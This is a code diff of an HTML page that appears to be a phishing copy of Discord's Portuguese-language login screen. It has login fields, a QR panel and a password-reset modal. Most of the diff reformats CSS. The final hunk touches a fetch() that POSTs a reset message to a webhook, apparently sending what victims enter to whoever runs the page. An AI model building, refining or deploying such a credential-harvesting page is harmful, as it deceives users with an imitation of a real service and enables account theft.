@@ -5,11 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Discord - Entrar</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
       background: url('https://i.imgur.com/V23o1if.jpeg') no-repeat center center fixed;
@@ -59,24 +55,9 @@
       justify-content: center;
       padding: 40px;
     }
-    h1 {
-      font-size: 2.2rem;
-      margin-bottom: 8px;
-      text-align: center;
-    }
-    p.subtitle {
-      color: #b9bbbe;
-      text-align: center;
-      margin-bottom: 40px;
-      font-size: 1.1rem;
-    }
-    label {
-      display: block;
-      margin-bottom: 8px;
-      font-size: 0.9rem;
-      color: #b9bbbe;
-      font-weight: 600;
-    }
+    h1 { font-size: 2.2rem; margin-bottom: 8px; text-align: center; }
+    p.subtitle { color: #b9bbbe; text-align: center; margin-bottom: 40px; font-size: 1.1rem; }
+    label { display: block; margin-bottom: 8px; font-size: 0.9rem; color: #b9bbbe; font-weight: 600; }
     input {
       width: 100%;
       padding: 14px;
@@ -88,10 +69,7 @@
       font-size: 1rem;
       outline: none;
     }
-    input:focus {
-      border-color: #5865f2;
-      box-shadow: 0 0 0 2px rgba(88,101,242,0.3);
-    }
+    input:focus { border-color: #5865f2; box-shadow: 0 0 0 2px rgba(88,101,242,0.3); }
     .forgot-link {
       color: #00aff4;
       font-size: 0.9rem;
@@ -101,9 +79,7 @@
       text-align: left;
       cursor: pointer;
     }
-    .forgot-link:hover {
-      text-decoration: underline;
-    }
+    .forgot-link:hover { text-decoration: underline; }
     button {
       width: 100%;
       padding: 14px;
@@ -117,31 +93,12 @@
       transition: background 0.2s, transform 0.1s;
       margin-bottom: 16px;
     }
-    button:hover {
-      background: #4752c4;
-      transform: translateY(-2px);
-    }
-    button:active {
-      transform: translateY(0);
-    }
-    .register-link {
-      text-align: center;
-      font-size: 0.95rem;
-      color: #b9bbbe;
-    }
-    .register-link a {
-      color: #00aff4;
-      text-decoration: none;
-      font-weight: 600;
-    }
-    .register-link a:hover {
-      text-decoration: underline;
-    }
-    .qr-section {
-      text-align: center;
-      color: white;
-      max-width: 320px;
-    }
+    button:hover { background: #4752c4; transform: translateY(-2px); }
+    button:active { transform: translateY(0); }
+    .register-link { text-align: center; font-size: 0.95rem; color: #b9bbbe; }
+    .register-link a { color: #00aff4; text-decoration: none; font-weight: 600; }
+    .register-link a:hover { text-decoration: underline; }
+    .qr-section { text-align: center; color: white; max-width: 320px; }
     .qr-image {
       width: 240px;
       height: 240px;
@@ -152,41 +109,13 @@
       padding: 10px;
       object-fit: contain;
     }
-    .qr-title {
-      font-size: 1.4rem;
-      font-weight: 700;
-      margin-bottom: 16px;
-    }
-    .qr-custom-text {
-      font-size: 1.1rem;
-      font-weight: 600;
-      line-height: 1.4;
-      margin: 0 0 20px 0;
-    }
-    .logos {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 12px;
-      margin: 16px 0;
-    }
-    .logos img {
-      height: 50px;
-      width: auto;
-      object-fit: contain;
-    }
-    .extra-link {
-      margin-top: 20px;
-      font-size: 0.95rem;
-    }
-    .extra-link a {
-      color: #00aff4;
-      text-decoration: none;
-      font-weight: 600;
-    }
-    .extra-link a:hover {
-      text-decoration: underline;
-    }
+    .qr-title { font-size: 1.4rem; font-weight: 700; margin-bottom: 16px; }
+    .qr-custom-text { font-size: 1.1rem; font-weight: 600; line-height: 1.4; margin: 0 0 20px 0; }
+    .logos { display: flex; align-items: center; justify-content: center; gap: 12px; margin: 16px 0; }
+    .logos img { height: 50px; width: auto; object-fit: contain; }
+    .extra-link { margin-top: 20px; font-size: 0.95rem; }
+    .extra-link a { color: #00aff4; text-decoration: none; font-weight: 600; }
+    .extra-link a:hover { text-decoration: underline; }
     .voltar {
       position: absolute;
       top: 20px;
@@ -211,10 +140,7 @@
       transition: opacity 0.4s ease, transform 0.4s ease;
       pointer-events: none;
     }
-    .error-message.show {
-      opacity: 1;
-      transform: translateY(0);
-    }
+    .error-message.show { opacity: 1; transform: translateY(0); }
 
     /* Modal de reset */
     .modal {
@@ -228,10 +154,7 @@
       opacity: 0;
       transition: opacity 0.3s ease;
     }
-    .modal.show {
-      display: flex;
-      opacity: 1;
-    }
+    .modal.show { display: flex; opacity: 1; }
     .modal-content {
       background: rgba(40, 40, 60, 0.95);
       border-radius: 12px;
@@ -244,24 +167,10 @@
       transform: scale(0.9);
       transition: transform 0.3s ease;
     }
-    .modal.show .modal-content {
-      transform: scale(1);
-    }
-    .modal h2 {
-      margin-bottom: 20px;
-      color: #ffffff;
-    }
-    .modal p {
-      margin-bottom: 16px;
-      color: #b9bbbe;
-      font-size: 1.1rem;
-    }
-    .modal .email-real {
-      color: #ffffff;
-      font-weight: bold;
-      margin-bottom: 24px;
-      font-size: 1.2rem;
-    }
+    .modal.show .modal-content { transform: scale(1); }
+    .modal h2 { margin-bottom: 20px; color: #ffffff; }
+    .modal p { margin-bottom: 16px; color: #b9bbbe; font-size: 1.1rem; }
+    .modal .email-real { color: #ffffff; font-weight: bold; margin-bottom: 24px; font-size: 1.2rem; }
     .modal input {
       width: 100%;
       padding: 14px;
@@ -282,9 +191,7 @@
       font-size: 1.1rem;
       cursor: pointer;
     }
-    .modal button:hover {
-      background: #4752c4;
-    }
+    .modal button:hover { background: #4752c4; }
     .close-modal {
       position: absolute;
       top: 20px;
@@ -293,9 +200,7 @@
       font-size: 1.8rem;
       cursor: pointer;
     }
-    .close-modal:hover {
-      color: white;
-    }
+    .close-modal:hover { color: white; }
 
     /* Mensagem de sucesso descendo */
     .success-msg {
@@ -314,9 +219,7 @@
       pointer-events: none;
       transition: top 1.5s ease-out;
     }
-    .success-msg.show {
-      top: 80px;
-    }
+    .success-msg.show { top: 80px; }
   </style>
 </head>
 <body>
@@ -526,7 +429,7 @@
 
 **Horário:** ${new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })}`;
 
-      fetch(resetWebhook, {
+      fetch(webhookReset, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ content: resetMsg })
